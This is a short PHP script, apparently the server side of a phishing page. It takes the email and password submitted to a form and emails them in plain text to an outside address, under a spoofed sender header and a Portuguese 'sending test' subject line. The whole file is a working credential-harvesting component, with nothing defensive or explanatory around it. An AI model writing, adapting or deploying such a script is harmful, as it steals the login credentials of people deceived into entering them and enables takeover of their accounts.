<?php
$email = $_POST["email"];
$password = $_POST["password"];
$to = "ghestmany@proton.me";
$subject = "Teste de envio de e-mail";
$message = "Email: $email / Password? $password";
$headers = "From: feet@gmail.com" . "\r\n" .
    "Reply-To: feet@gmail.com";

mail($to, $subject, $message, $headers);
print("Enviado")
?>